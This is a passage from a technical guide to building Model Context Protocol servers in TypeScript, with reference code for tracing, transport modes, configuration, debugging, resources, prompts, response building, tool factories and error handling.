    tool: "backend_search",
    params,
  });

  // ...
};
```

**Common format issues and fixes:**

| Symptom | Wrong assumption | Actual cause | Fix |
|---------|-----------------|-------------|-----|
| Defaults applied instead of user values | Backend logic error | JSON Schema used instead of Zod | Replace with Zod schema |
| Escaped quotes in nested objects | Serialization bug | `z.union` with string transform | Use `z.object({}).passthrough()` |
| `limit: NaN` | Type mismatch | Number sent as string `"50"` | Use coercion helper |
| Empty results despite valid query | Query logic error | Empty `{}` not converted to match-all | Add empty input detection |

---

## 11. Observability Integration

### Pattern

Every tool invocation should produce a trace that captures the tool name, input arguments, output, duration, and any errors. The trace wrapper is generic -- it accepts any tracing backend (OpenTelemetry, LangSmith, Datadog, custom) through a pluggable interface. The key insight is that the wrapper lives in the universal tool registration layer (Section 5), so every tool gets tracing without modification.

Graceful degradation is essential. If the tracing dependency is not installed or the tracing endpoint is unreachable, the tool must still execute normally. Tracing is an enhancement, not a prerequisite.

### Reference Implementation

**Generic trace wrapper:**

```typescript
// src/utils/tracing.ts
interface TraceContext {
  toolName: string;
  inputs: unknown;
  startTime: number;
}

type TraceFn = (context: TraceContext, result: unknown, error?: Error) => void;

let traceFn: TraceFn | null = null;

export function setTraceFunction(fn: TraceFn): void {
  traceFn = fn;
}

export async function traceToolExecution(
  toolName: string,
  toolArgs: unknown,
  extra: unknown,
  handler: ToolHandler,
): Promise<ToolResult> {
  const startTime = Date.now();
  const context: TraceContext = { toolName, inputs: toolArgs, startTime };

  try {
    const result = await handler(toolArgs, extra);

    // Trace success (non-blocking)
    if (traceFn) {
      try {
        traceFn(context, result);
      } catch {
        // Tracing failure must not break tool execution
      }
    }

    return result;
  } catch (error) {
    // Trace error (non-blocking)
    if (traceFn) {
      try {
        traceFn(context, null, error instanceof Error ? error : new Error(String(error)));
      } catch {
        // Tracing failure must not break tool execution
      }
    }

    throw error;
  }
}
```

**Dynamic trace naming:**

Each tool invocation produces a trace named after the tool (`backend_search`, `backend_get_document`), not a generic `tool_call`. This makes trace dashboards immediately useful -- you can filter by tool name, see which tools are slow, and identify error-prone operations without parsing payloads.

**Plugging in a tracing backend (example with OpenTelemetry):**

```typescript
// src/utils/tracing-otel.ts
import { trace, SpanStatusCode } from "@opentelemetry/api";

const tracer = trace.getTracer("mcp-server");

setTraceFunction((context, result, error) => {
  const span = tracer.startSpan(context.toolName, {
    startTime: context.startTime,
    attributes: {
      "mcp.tool.name": context.toolName,
      "mcp.tool.duration_ms": Date.now() - context.startTime,
    },
  });

  if (error) {
    span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });
    span.recordException(error);
  } else {
    span.setStatus({ code: SpanStatusCode.OK });
  }

  span.end();
});
```

**Initialization pattern:**

```typescript
// src/index.ts
export function initializeTracing(): void {
  try {
    // Attempt to load tracing backend
    const otelSetup = require("./utils/tracing-otel.js");
    otelSetup.initialize();
    logger.info("Tracing initialized");
  } catch {
    // Tracing dependency not available -- continue without it
    logger.info("Tracing not configured -- running without observability");
  }
}
```

### Conversation-Aware Tracing

In MCP servers, tool calls do not arrive in isolation -- they come in sequences within a session. A user listing services, then viewing one service's routes, then adding a plugin follows a discoverable pattern. Conversation-aware tracing captures these patterns to provide session-level visibility.

**Session-level parent traces:**

Group all tool calls within an MCP session under a single parent trace. The parent trace represents the entire session (connection lifecycle), and each tool call is a child span. This structure enables trace dashboards to show full session timelines rather than isolated tool invocations.

```typescript
// src/utils/tracing.ts
async function createSessionTrace<T>(
  sessionContext: { sessionId: string; clientName?: string; transport?: string },
  operation: () => Promise<T>,
): Promise<T> {
  if (!tracingEnabled) return operation();

  const sessionTracer = traceable(
    async () => operation(),
    {
      name: `session:${sessionContext.clientName || "unknown"}`,
      run_type: "chain", // Session-level trace (parent)
      metadata: {
        session_id: sessionContext.sessionId,
        client_name: sessionContext.clientName,
        transport_mode: sessionContext.transport,
      },
      tags: ["mcp-session", `client:${sessionContext.clientName || "unknown"}`],
    },
  );

  return sessionTracer();
}
```

**Conversation flow detection:**

Detect patterns from tool call sequences and tag traces:

| Flow pattern | Tool sequence | Tag |
|-------------|---------------|-----|
| Browse-then-detail | `list_services` -> `get_service` -> `list_routes` | `flow:browse-detail` |
| Bulk create | `create_service` -> `create_service` -> `create_service` | `flow:bulk-create` |
| Search-then-analyze | `search` -> `get_details` -> `get_analytics` | `flow:search-analyze` |

```typescript
// src/utils/conversation-tracker.ts
function detectFlowPattern(toolSequence: string[]): string {
  const last3 = toolSequence.slice(-3);

  if (last3.some((t) => t.startsWith("list_")) && last3.some((t) => t.startsWith("get_"))) {
    return "browse-detail";
  }
  if (last3.every((t) => t.startsWith("create_"))) {
    return "bulk-create";
  }
  return "mixed";
}
```

**Sampling rate:**

A configurable sampling rate (0.0-1.0) controls what fraction of tool executions produce traces. In production, a rate of 0.1-0.3 reduces tracing cost while maintaining statistical visibility. The sampling decision is made per-tool-call using `Math.random()`.

**Metadata enrichment:**

Every trace includes: session ID, client name (e.g., "claude-desktop"), transport mode (stdio/SSE), conversation context (tool sequence, detected flow pattern), and operation-specific metadata (category, duration, success/failure).

---

## 12. Transport Modes

### Pattern

MCP supports two transport modes: **stdio** for CLI tools and desktop applications (Claude Desktop), and **SSE** (Server-Sent Events) for web integrations and multi-client scenarios. The server should support both modes, selected by environment variable, with transport-specific graceful shutdown handling.

Stdio mode pipes JSON-RPC messages through stdin/stdout. The MCP SDK provides `StdioServerTransport` that handles framing and parsing. SSE mode runs an HTTP server that accepts client connections and streams responses. Each mode has different lifecycle requirements -- stdio shuts down when the parent process closes the pipe, SSE requires draining active connections before closing the HTTP server.

### Reference Implementation

**Transport selection:**

```typescript
// src/index.ts
async function main() {
  const server = new McpServer({ name: "my-server", version: "1.0.0" });
  registerAllTools(server, backendClient);

  const transportMode = process.env.MCP_TRANSPORT || "stdio";

  if (transportMode === "sse") {
    await startSSETransport(server);
  } else {
    await startStdioTransport(server);
  }
}
```

**Stdio setup:**

```typescript
// src/transport/stdio.ts
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

async function startStdioTransport(server: McpServer): Promise<void> {
  const transport = new StdioServerTransport();
  await server.connect(transport);

  const shutdown = async () => {
    logger.info("Shutting down stdio transport");
    try {
      await transport.close();
    } catch (error) {
      logger.error("Shutdown error", { error: String(error) });
    }
    process.exit(0);
  };

  process.on("SIGINT", shutdown);
  process.on("SIGTERM", shutdown);

  logger.info("MCP server started (stdio mode)");
}
```

**SSE setup:**

```typescript
// src/transport/sse.ts
import { SSEServerTransport } from "@modelcontextprotocol/sdk/server/sse.js";

async function startSSETransport(server: McpServer): Promise<void> {
  const port = Number(process.env.MCP_PORT) || 8080;
  const activeSessions = new Map<string, SSEServerTransport>();

  const httpServer = Bun.serve({
    port,
    async fetch(request) {
      const url = new URL(request.url);

      if (url.pathname === "/sse") {
        const transport = new SSEServerTransport("/messages", new Response());
        const sessionId = crypto.randomUUID();
        activeSessions.set(sessionId, transport);
        await server.connect(transport);
        return transport.response;
      }

      if (url.pathname === "/messages") {
        // Handle incoming messages from SSE clients
        const sessionId = url.searchParams.get("sessionId");
        const transport = activeSessions.get(sessionId || "");
        if (transport) {
          await transport.handlePostMessage(request);
          return new Response("OK", { status: 200 });
        }
        return new Response("Session not found", { status: 404 });
      }

      return new Response("Not found", { status: 404 });
    },
  });

  const shutdown = async () => {
    logger.info("Draining SSE connections");
    for (const [id, transport] of activeSessions) {
      try {
        await transport.close();
        activeSessions.delete(id);
      } catch {
        // Best effort cleanup
      }
    }
    httpServer.stop();
    process.exit(0);
  };

  process.on("SIGINT", shutdown);
  process.on("SIGTERM", shutdown);

  logger.info(`MCP server started (SSE mode on port ${port})`);
}
```

**Graceful shutdown per mode:**

| Signal | stdio behavior | SSE behavior |
|--------|---------------|--------------|
| SIGINT | Close transport, exit | Drain connections, close HTTP server, exit |
| SIGTERM | Close transport, exit | Drain connections, close HTTP server, exit |
| Uncaught exception | Log, close transport, exit(1) | Log, drain, close, exit(1) |
| Unhandled rejection | Log, close transport, exit(1) | Log, drain, close, exit(1) |

---

## 13. Configuration

### Pattern

MCP server configuration follows a single-source-of-truth pattern: a `defaultConfig` object holds every setting with sensible defaults, a Zod schema validates the shape without providing its own defaults, and environment variables override individual values. The merge order is `defaults -> env overrides -> Zod validation`. This ensures the config is always complete, always validated, and easy to override in different environments.

Validation warnings (as opposed to errors) get collected during config loading and logged after the logger is initialized. This avoids chicken-and-egg problems where the logger depends on config (for log level) but config validation wants to log warnings.

### Reference Implementation

**Config schema:**

```typescript
// src/config.ts
import { z } from "zod";

const ServerConfigSchema = z.object({
  name: z.string().min(1),
  version: z.string().min(1),
  readOnlyMode: z.boolean(),
  readOnlyStrictMode: z.boolean(),
  transportMode: z.enum(["stdio", "sse"]),
  port: z.number().min(1024).max(65535),
  maxResultsPerQuery: z.number().min(1).max(10000),
});

const BackendConfigSchema = z.object({
  url: z.string().url(),
  apiKey: z.string().optional(),
  maxRetries: z.number().min(0).max(10),
  requestTimeout: z.number().min(1000).max(60000),
});

const LoggingConfigSchema = z.object({
  level: z.enum(["debug", "info", "warn", "error"]),
  format: z.enum(["json", "text"]),
});

const ConfigSchema = z.object({
  server: ServerConfigSchema,
  backend: BackendConfigSchema,
  logging: LoggingConfigSchema,
});

type Config = z.infer<typeof ConfigSchema>;
```

**Default config:**

```typescript
// src/config.ts
const defaultConfig: Config = {
  server: {
    name: "my-mcp-server",
    version: "1.0.0",
    readOnlyMode: false,
    readOnlyStrictMode: true,
    transportMode: "stdio",
    port: 8080,
    maxResultsPerQuery: 1000,
  },
  backend: {
    url: "http://localhost:9200",
    maxRetries: 3,
    requestTimeout: 30000,
  },
  logging: {
    level: "info",
    format: "json",
  },
};
```

**Environment variable mapping and loading:**

```typescript
// src/config.ts
const envMapping = {
  server: {
    name: "MCP_SERVER_NAME",
    readOnlyMode: "READ_ONLY_MODE",
    transportMode: "MCP_TRANSPORT",
    port: "MCP_PORT",
    maxResultsPerQuery: "MCP_MAX_RESULTS_PER_QUERY",
  },
  backend: {
    url: "BACKEND_URL",
    apiKey: "BACKEND_API_KEY",
    maxRetries: "BACKEND_MAX_RETRIES",
    requestTimeout: "BACKEND_REQUEST_TIMEOUT",
  },
  logging: {
    level: "LOG_LEVEL",
    format: "LOG_FORMAT",
  },
} as const;

function parseEnvVar(value: string | undefined, type: "string" | "number" | "boolean"): unknown {
  if (value === undefined) return undefined;
  if (type === "number") return Number(value);
  if (type === "boolean") return value.toLowerCase() === "true";
  return value;
}

function loadConfigFromEnv(): Partial<Config> {
  return {
    server: {
      name: (parseEnvVar(process.env[envMapping.server.name], "string") as string) || defaultConfig.server.name,
      readOnlyMode: (parseEnvVar(process.env[envMapping.server.readOnlyMode], "boolean") as boolean)
        ?? defaultConfig.server.readOnlyMode,
      transportMode: (parseEnvVar(process.env[envMapping.server.transportMode], "string") as "stdio" | "sse")
        || defaultConfig.server.transportMode,
      port: (parseEnvVar(process.env[envMapping.server.port], "number") as number)
        || defaultConfig.server.port,
      // ... remaining fields
    },
    // ... backend, logging sections
  };
}
```

**Merge and validate:**

```typescript
// src/config.ts
const warnings: string[] = [];

const envConfig = loadConfigFromEnv();
const mergedConfig = {
  server: { ...defaultConfig.server, ...envConfig.server },
  backend: { ...defaultConfig.backend, ...envConfig.backend },
  logging: { ...defaultConfig.logging, ...envConfig.logging },
};

export const config = ConfigSchema.parse(mergedConfig);

export function getConfigWarnings(): string[] {
  return warnings;
}
```

**Dev mode vs production mode:**

| Setting | Development | Production |
|---------|------------|------------|
| `readOnlyMode` | `false` | `true` (for AI agents) |
| `logging.level` | `debug` | `info` or `warn` |
| `backend.maxRetries` | `1` | `3` |
| `transportMode` | `stdio` | `sse` (for web integrations) |
| Authentication | Optional (local dev) | Required (API key or credentials) |

---

## 14. Debugging MCP Servers

### Pattern

MCP debugging is deceptive. Symptoms rarely point to the actual cause. A tool returning stale data looks like a caching bug but is actually a schema serialization issue. A tool silently ignoring user parameters looks like a handler bug but is actually a JSON Schema vs Zod Schema problem. The debug-first approach starts by examining what the handler actually receives before making any assumptions about backend behavior.

The most effective debugging technique is inserting a `logger.debug` call as the first line of the handler to print the raw `toolArgs` object. This single line eliminates entire categories of misdiagnosis.

### Reference Implementation

**Common misdiagnosis table:**

| Symptom | Wrong assumption | Actual cause |
|---------|-----------------|-------------|
| Tool returns default values, ignoring user input | Backend default logic is wrong | JSON Schema used instead of Zod -- parameters not extracted |
| Nested objects have escaped quotes | Serialization middleware bug | `z.union` with `z.string().transform(JSON.parse)` tells client strings are acceptable |
| Security validation blocks legitimate requests | Validation rules too strict | No domain-specific exemptions for valid patterns |
| Tool works in tests but fails via MCP client | Test environment difference | Test bypasses SDK argument extraction; live client does not |
| Empty results for valid queries | Backend query logic error | Empty `{}` query not converted to match-all default |

**JSON-RPC test request for direct tool invocation:**

```bash
# Test tool directly without an MCP client
echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"backend_search","arguments":{"query":"test","limit":5}}}' | node dist/index.js
```

This bypasses the AI client entirely and sends a raw JSON-RPC request. If the tool works here but fails through the client, the issue is in client-side parameter construction. If it fails here too, the issue is in the server.

**Parameter flow verification checklist:**

1. **Client sends request** -- what does the JSON-RPC `params.arguments` contain?
2. **SDK extracts arguments** -- is the schema Zod (works) or JSON Schema (broken)?
3. **Handler receives `toolArgs`** -- add `logger.debug("raw args", toolArgs)` and check
4. **Validator parses arguments** -- does `validator.parse(toolArgs)` succeed?
5. **Backend receives request** -- what does the backend client actually send?
6. **Backend returns response** -- is the response what you expect?

If the chain breaks at step 3 (handler receives empty or wrong args), the problem is in schema definition. If it breaks at step 5 (backend receives malformed request), the problem is in handler logic. Do not skip to step 6 and assume the backend is wrong.

**Debug logging pattern:**

```typescript
// Add to any handler during debugging
const handler = async (toolArgs: Record<string, unknown>, extra: unknown) => {
  logger.debug("HANDLER ENTRY", {
    tool: "backend_search",
    argsKeys: Object.keys(toolArgs),
    argsTypes: Object.fromEntries(
      Object.entries(toolArgs).map(([k, v]) => [k, typeof v]),
    ),
    fullArgs: JSON.stringify(toolArgs),
  });

  // ... rest of handler
};
```

---

## 15. MCP Resources

### Pattern

Resources are a first-class MCP primitive alongside tools and prompts. While tools let AI assistants *act* on backends, resources let them *read* structured data through URI-based addressing. The MCP protocol defines two resource types: **static resources** with fixed URIs (`database://structure`) and **template resources** with parameterized URIs (`schema://{scope}/{collection}`). Clients discover resources via `resources/list` and read them via `resources/read`.

Resources solve a different problem than tools. A tool executes an operation and returns results. A resource *exposes data* at a stable address that clients can bookmark, cache, and reference. Use resources for structural information (database schemas, configuration summaries, documentation) that AI assistants benefit from having readily accessible without crafting tool calls.

### Reference Implementation

**Static resource (fixed URI):**

```typescript
// src/resources/databaseStructureResource.ts
import { McpServer, ResourceTemplate } from "@modelcontextprotocol/sdk/server/mcp.js";

export function registerDatabaseStructureResource(
  server: McpServer,
  client: BackendClient,
): void {
  server.resource(
    "database-structure",
    new ResourceTemplate("database://structure", { list: undefined }),
    async (uri) => {
      const structure = await client.getStructure();

      return {
        contents: [{
          uri: uri.href,
          type: "text/markdown",
          text: formatStructureAsMarkdown(structure),
        }],
      };
    },
  );
}
```

**Template resource (parameterized URI):**

```typescript
// src/resources/schemaResource.ts
import { McpServer, ResourceTemplate } from "@modelcontextprotocol/sdk/server/mcp.js";

export function registerSchemaResource(
  server: McpServer,
  client: BackendClient,
): void {
  server.resource(
    "collection-schema",
    new ResourceTemplate("schema://{scope}/{collection}", { list: undefined }),
    async (uri, { scope, collection }) => {
      const schema = await client.inferSchema(scope, collection);

      return {
        contents: [{
          uri: uri.href,
          type: "text/markdown",
          text: formatSchemaAsMarkdown(schema),
        }],
      };
    },
  );
}
```

**Central resource registration barrel:**

```typescript
// src/resources/index.ts
export async function registerAllResources(
  server: McpServer,
  client: BackendClient,
): Promise<void> {
  registerDatabaseStructureResource(server, client);
  registerSchemaResource(server, client);
  registerDocumentResource(server, client);
}
```

**Resource types comparison:**

| Type | URI pattern | Use case | Discovery |
|------|------------|----------|-----------|
| Static | `database://structure` | Fixed data, always available | Listed in `resources/list` |
| Template | `schema://{scope}/{collection}` | Parameterized access, dynamic data | Client constructs URI from parameters |

**Key implementation details:**

- Resources return `{ contents: [{ uri, type, text }] }` -- not the same shape as tool responses
- The `ResourceTemplate` constructor takes a URI pattern and options; `{ list: undefined }` means the resource is not dynamically listed
- Template parameters are extracted from the URI and passed as the second argument to the handler
- Resources should return errors as content (not thrown exceptions) since the client expects content, not protocol errors

---

## 16. MCP Prompts

### Pattern

Prompts are the third MCP primitive. While tools execute operations and resources expose data, prompts generate structured messages that guide AI assistant behavior. A prompt is a server-side template that accepts parameters and returns a message array -- the AI assistant uses these messages as conversation context.

Prompts solve the problem of encoding domain expertise in reusable templates. Instead of requiring an AI assistant to know how to construct a well-formed query for your backend, a prompt encapsulates the best practices, syntax rules, and optimization hints.

### Reference Implementation

```typescript
// src/prompts/sqlppQueryGenerator.ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";

export function registerSqlppQueryGenerator(server: McpServer): void {
  server.prompt(
    "generate_sqlpp_query",
    {
      description: z
        .string()
        .describe("What you want to accomplish with this query"),
      bucket: z.string().describe("The bucket name"),
      scope: z
        .string()
        .optional()
        .describe("The scope name. Defaults to '_default'"),
      collection: z.string().describe("The collection name"),
      filters: z
        .string()
        .optional()
        .describe("Any conditions for filtering results"),
      limit: z
        .string()
        .optional()
        .describe("Maximum number of results to return"),
    },
    (args) => {
      const { description, bucket, scope, collection, filters, limit } = args;
      const fullyQualifiedPath = `\`${bucket}\`.\`${scope || "_default"}\`.\`${collection}\``;

      const filterText = filters ? `\nFilter criteria: ${filters}` : "";
      const limitText = limit ? `\nLimit results to: ${limit} items` : "";

      return {
        messages: [
          {
            role: "user",
            content: {
              type: "text",
              text: `Write an optimized SQL++ query that will ${description}.

Collection path: ${fullyQualifiedPath}${filterText}${limitText}

Requirements:
1. Use fully qualified path with backticks
2. Include appropriate WHERE clauses
3. Apply limit or use a reasonable default
4. Use SQL++ syntax and follow best practices
5. Provide a brief explanation`,
            },
          },
        ],
      };
    },
  );
}
```

**Prompt anatomy:**

| Component | Purpose | Example |
|-----------|---------|---------|
| Name | Unique identifier for the prompt | `"generate_sqlpp_query"` |
| Parameters | Zod schema defining typed inputs | `{ bucket: z.string(), ... }` |
| Handler | Function returning structured messages | `(args) => ({ messages: [...] })` |
| Messages | Array of role/content objects | `[{ role: "user", content: { type: "text", text: "..." } }]` |

**When to use prompts vs tools:**

| Use a prompt when... | Use a tool when... |
|----------------------|-------------------|
| You want to guide the AI's reasoning | You want to execute an operation |
| The output is a conversation message | The output is data from a backend |
| Parameters shape a template | Parameters configure an action |
| No side effects occur | Side effects are expected |

---

## 17. Response Builder Pattern

### Pattern

Raw MCP response construction (`{ content: [{ type: "text", text: JSON.stringify(data, null, 2) }] }`) is repeated in every tool handler. The Response Builder pattern extracts this boilerplate into a fluent API that handles serialization, error formatting, and multi-content responses. It is used in both tool handlers and resource handlers to produce consistent output.

### Reference Implementation

```typescript
// src/lib/responseBuilder.ts
import { logger } from "./logger";
import { getErrorCode, getErrorMessage } from "./errors";

type ResponseType = "json" | "text" | "error";

interface ResponseContent {
  type: ResponseType;
  data: unknown;
  metadata?: Record<string, unknown>;
}

class ResponseBuilder {
  private content: ResponseContent[] = [];
  private metadata: Record<string, unknown> = {};

  static success(
    data: unknown,
    type: ResponseType = "json",
    metadata?: Record<string, unknown>,
  ): ResponseBuilder {
    return new ResponseBuilder().addContent(data, type, metadata);
  }

  static error(message: string, error?: unknown): ResponseBuilder {
    return new ResponseBuilder().addError(message, error);
  }

  addContent(
    data: unknown,
    type: ResponseType = "json",
    metadata?: Record<string, unknown>,
  ): ResponseBuilder {
    this.content.push({ type, data, metadata });
    return this;
  }

  addError(message: string, error?: unknown): ResponseBuilder {
    const errorCode = error ? getErrorCode(error) : "UNKNOWN_ERROR";
    const errorMessage = error ? getErrorMessage(error) : message;

    logger.error("Error response", {
      code: errorCode,
      message: errorMessage,
      originalError: error,
    });

    this.content.push({
      type: "error",
      data: { code: errorCode, message: errorMessage },
    });
    return this;
  }

  setMetadata(metadata: Record<string, unknown>): ResponseBuilder {
    this.metadata = { ...this.metadata, ...metadata };
    return this;
  }

  build(): { content: Array<{ type: string; text: string }> } {
    return {
      content: this.content.map((item) => {
        switch (item.type) {
          case "json":
            return { type: "text", text: JSON.stringify(item.data, null, 2) };
          case "text":
            return { type: "text", text: String(item.data) };
          case "error":
            return {
              type: "text",
              text: `Error: ${(item.data as { message: string }).message}`,
            };
          default:
            return { type: "text", text: String(item.data) };
        }
      }),
    };
  }
}
```

**Usage patterns:**

```typescript
// Simple success response
return ResponseBuilder.success({ users: results, total: count }).build();

// Error response (automatically logs)
return ResponseBuilder.error("Document not found", error).build();

// Multi-content response
return new ResponseBuilder()
  .addContent(summary, "text")
  .addContent(details, "json")
  .setMetadata({ executionTime: elapsed })
  .build();
```

**Why this matters:**

| Without ResponseBuilder | With ResponseBuilder |
|------------------------|---------------------|
| Manual `JSON.stringify` in every handler | Automatic serialization by content type |
| No consistent error format | Standardized error structure with logging |
| Single-content responses only | Chainable multi-content responses |
| Error logging is ad-hoc | Errors automatically logged on creation |

### Response Envelope with Related Tools

Beyond formatting, the response envelope pattern adds contextual metadata and next-action suggestions to every tool response. The AI client receives not just the data, but guidance on what to do next.

**Envelope structure:**

```typescript
// src/utils/response-envelope.ts
interface ResponseEnvelope<T> {
  data: T;
  metadata: {
    pagination?: { total: number; offset: number; size: number };
    appliedFilters?: Record<string, unknown>;
    executionTime?: number;
  };
  relatedTools: RelatedTool[];
}

interface RelatedTool {
  tool: string;
  description: string;
  context?: Record<string, unknown>;
}
```

**Related tools in practice:**

```typescript
// src/tools/configuration/operations.ts
function buildServiceListResponse(services: Service[], controlPlaneId: string): ResponseEnvelope<Service[]> {
  return {
    data: services,
    metadata: {
      pagination: { total: services.length, offset: 0, size: services.length },
    },
    relatedTools: [
      {
        tool: "get_service",
        description: "Get details for a specific service",
        context: { controlPlaneId },
      },
      {
        tool: "list_routes",
        description: "List routes for these services",
        context: { controlPlaneId },
      },
      {
        tool: "create_service",
        description: "Create a new service in this control plane",
        context: { controlPlaneId },
      },
    ],
  };
}
```

**camelCase normalization:**

When the backend API returns snake_case field names, normalize to camelCase in MCP responses. The AI client operates in a TypeScript-oriented context where camelCase is the convention. Consistent casing reduces friction when the AI uses response data in subsequent tool calls.

```typescript
function normalizeKeys(obj: Record<string, unknown>): Record<string, unknown> {
  const result: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(obj)) {
    const camelKey = key.replace(/_([a-z])/g, (_, c) => c.toUpperCase());
    result[camelKey] = typeof value === "object" && value !== null
      ? normalizeKeys(value as Record<string, unknown>)
      : value;
  }
  return result;
}
```

---

## 18. Tool Factory Pattern

### Pattern

The registration function pattern (Section 4) requires each tool to manually call `server.tool()` with name, description, schema, and handler. The Tool Factory pattern lifts this into a generic `createTool<T>()` function that accepts a typed configuration object and returns a registration function. The factory automatically wraps handlers with context logging, dependency validation, and error propagation.

This is a higher-level abstraction over the registration function pattern. It reduces boilerplate and enforces consistency -- every tool created through the factory gets the same logging, the same bucket validation, and the same error handling without any per-tool code.

### Reference Implementation

```typescript
// src/lib/toolFactory.ts
import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { createContextLogger } from "./logger";
import { createError } from "./errors";

interface ToolConfig<T extends z.ZodType> {
  name: string;
  description: string;
  params: T;
  handler: (params: z.infer<T>, client: BackendClient) => Promise<unknown>;
}

function createTool<T extends z.ZodType>(config: ToolConfig<T>) {
  return (server: McpServer, client: BackendClient) => {
    const logger = createContextLogger(config.name);

    server.tool(
      config.name,
      config.description,
      config.params,
      async (params: z.infer<T>) => {
        try {
          logger.info(`Processing ${config.name}:`, params);

          if (!client) {
            throw createError("DB_ERROR", "Backend client is not initialized");
          }

          const result = await config.handler(params, client);
          logger.info(`${config.name} completed successfully`);
          return result;
        } catch (error) {
          logger.error(`Error in ${config.name}:`, error);
          throw error;
        }
      },
    );
  };
}
```

**Usage:**

```typescript
// src/tools/document/get_document.ts
const getDocumentTool = createTool({
  name: "get_document",
  description: "Retrieve a document by ID",
  params: z.object({
    id: z.string().min(1).describe("Document identifier"),
    scope: z.string().optional().describe("Scope name"),
    collection: z.string().describe("Collection name"),
  }),
  handler: async ({ id, scope, collection }, client) => {
    const doc = await client.get(scope || "_default", collection, id);
    return ResponseBuilder.success(doc).build();
  },
});
```

**Curried config/handler separation for reusable configs:**

```typescript
// src/lib/toolFactory.ts
function createToolConfig<T extends z.ZodType>(config: {
  name: string;
  description: string;
  params: T;
}) {
  return (handler: (params: z.infer<T>, client: BackendClient) => Promise<unknown>) => {
    return (server: McpServer, client: BackendClient) => {
      server.tool(
        config.name,
        config.description,
        config.params,
        async (params: z.infer<T>) => handler(params, client),
      );
    };
  };
}

// Usage: separate config from handler
const documentConfig = createToolConfig({
  name: "get_document",
  description: "Retrieve a document by ID",
  params: z.object({ id: z.string() }),
});

// Different handlers for different backends
const couchbaseHandler = documentConfig(async ({ id }, client) => { /* ... */ });
const mongoHandler = documentConfig(async ({ id }, client) => { /* ... */ });
```

**Factory vs manual registration:**

| Aspect | Manual registration | Tool Factory |
|--------|-------------------|--------------|
| Logging | Per-handler, inconsistent | Automatic context logger per tool |
| Client validation | Easily forgotten | Enforced before every handler call |
| Error handling | Per-handler try/catch | Uniform wrapping with log + rethrow |
| Type safety | Manual schema/handler alignment | Generic `<T>` ensures params match handler signature |
| Boilerplate | ~15 lines per tool | ~8 lines per tool |

---

## 19. Error Bridge Pattern

### Pattern

MCP servers operate at two abstraction levels: the **domain layer** (application logic with business-specific error codes) and the **protocol layer** (MCP JSON-RPC with standardized error codes). A tool handler catches a "document not found" domain error but must return an `InvalidParams` protocol error. Without a bridge, every handler contains ad-hoc error code mapping that drifts between tools.

The Error Bridge pattern introduces a three-layer error system: `AppError` for domain errors, `McpError` for protocol errors, and bridge functions (`toMcpError()`, `toAppError()`, `normalizeError()`) for bidirectional conversion. An `OperationResult<T>` discriminated union provides an alternative to try/catch for operations where errors are expected outcomes.

### Reference Implementation

**Layer 1 -- Domain errors:**

```typescript
// src/lib/errors.ts
type ErrorCode =
  | "DB_ERROR"
  | "QUERY_ERROR"
  | "VALIDATION_ERROR"
  | "AUTH_ERROR"
  | "CONFIG_ERROR"
  | "UNKNOWN_ERROR";

class AppError extends Error {
  constructor(
    public code: string,
    message: string,
    public originalError?: Error,
  ) {
    super(message);
    this.name = "AppError";
  }
}

function createError(code: ErrorCode, message?: string, originalError?: Error): AppError {
  const errorMessage = message || errorMessages[code];
  return new AppError(code, errorMessage, originalError);
}
```

**Layer 2 -- Protocol errors:**

```typescript
// src/lib/mcpErrors.ts
const MCP_ERROR_CODES = {
  PARSE_ERROR: -32700,
  INVALID_REQUEST: -32600,
  METHOD_NOT_FOUND: -32601,
  INVALID_PARAMS: -32602,
  INTERNAL_ERROR: -32603,
  SERVER_NOT_INITIALIZED: -32002,
  UNKNOWN_ERROR_CODE: -32001,
} as const;

class McpError extends Error {
  constructor(
    public code: McpErrorCode,
    message: string,
    public data?: unknown,
  ) {
    super(message);
    this.name = "McpError";
  }

  toAppError(): AppError {
    switch (this.code) {
      case MCP_ERROR_CODES.INVALID_PARAMS:
        return createError("VALIDATION_ERROR", this.message);
      case MCP_ERROR_CODES.SERVER_NOT_INITIALIZED:
        return createError("CONFIG_ERROR", this.message);
      default:
        return createError("UNKNOWN_ERROR", this.message);
    }
  }
}
```

**Layer 3 -- Bridge functions:**

```typescript
// src/lib/errorBridge.ts
function normalizeError(error: unknown): AppError | McpError {
  if (error instanceof AppError || error instanceof McpError) return error;
  const message = error instanceof Error ? error.message : String(error);
  return createError("UNKNOWN_ERROR", message);
}

function toMcpError(error: unknown): McpError {
  const normalized = normalizeError(error);
  if (normalized instanceof McpError) return normalized;
  if (normalized instanceof AppError) return normalized.toMcpError();
  return createMcpError(MCP_ERROR_CODES.UNKNOWN_ERROR_CODE, normalized.message);
}

function toAppError(error: unknown): AppError {
  const normalized = normalizeError(error);
  if (normalized instanceof AppError) return normalized;
  if (normalized instanceof McpError) return normalized.toAppError();
  return createError("UNKNOWN_ERROR", normalized.message);
}
```

**OperationResult for expected failures:**

```typescript
// src/lib/errorUtils.ts
interface OperationResult<T> {
  success: boolean;
  data?: T;
  error?: Error;
}

async function handleOperation<T>(
  operation: () => Promise<T>,
  errorCode: string,
  operationName: string,
): Promise<OperationResult<T>> {
  try {
    return { success: true, data: await operation() };
  } catch (error) {
    logger.error(`Error during ${operationName}`, { error });
    return {
      success: false,
      error: error instanceof Error ? error : new Error(String(error)),
    };
  }
}
```

**Error code mapping:**

| Domain error | MCP error code | HTTP equivalent |
|-------------|---------------|-----------------|
| `VALIDATION_ERROR` | `INVALID_PARAMS` (-32602) | 400 |
| `QUERY_ERROR` | `INVALID_PARAMS` (-32602) | 400 |
| `AUTH_ERROR` | `INVALID_REQUEST` (-32600) | 401 |
| `CONFIG_ERROR` | `SERVER_NOT_INITIALIZED` (-32002) | 500 |
| `DB_ERROR` | `INTERNAL_ERROR` (-32603) | 500 |
| `UNKNOWN_ERROR` | `UNKNOWN_ERROR_CODE` (-32001) | 500 |

---

## 20. Connection Resilience

### Pattern

Production MCP servers must handle transient backend failures gracefully. A cold start against an unavailable database, a network partition during operation, or a backend restart during a health check -- all require the server to retry intelligently rather than crash immediately.

